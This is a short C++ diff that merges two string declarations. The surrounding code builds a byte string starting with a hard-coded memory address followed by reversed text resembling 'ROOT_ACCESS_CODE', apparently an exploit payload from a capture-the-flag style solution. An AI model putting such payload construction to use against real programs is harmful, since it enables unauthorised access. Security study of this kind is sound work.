@@ -84,8 +84,7 @@ int main(){
 	ios::sync_with_stdio(false);
 	cin.tie(NULL);
 	
-	string s;
-	string t;
+	string s, t;
 	t += "\x00\x20\x60\x00\x00\x00\x00\x00";
 	t += "\x43\x43\x41\x5f\x54\x4f\x4f\x52";
 	t += "\x45\x44\x4f\x43\x5f\x53\x53\x45";
